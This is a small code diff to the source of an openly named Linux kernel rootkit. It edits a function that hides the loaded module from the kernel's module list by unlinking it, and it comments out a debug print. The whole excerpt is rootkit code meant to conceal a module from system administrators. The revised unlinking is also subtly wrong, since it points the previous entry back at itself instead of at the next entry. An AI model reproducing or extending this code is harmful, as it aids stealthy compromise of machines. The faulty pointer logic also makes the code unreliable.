@@ -112,12 +112,13 @@ ssize_t file_hidden(char *filename){
     return 0;
 }
 
+/* 简单的脱链 */
 ssize_t module_hidden(void){
     struct list_head *list;
     list = &(THIS_MODULE->list);
-    printk(KERN_INFO "[peiwithhao rootkit] this module addr 0x%lx", (long unsigned int)list);
-    list->next->prev = list->next;
-    list->next->next = list->next;
+    //printk(KERN_INFO "[peiwithhao rootkit] this module addr 0x%lx", (long unsigned int)list);
+    list->next->prev = list->prev;
+    list->prev->next = list->prev;
     return 0;
 }
 
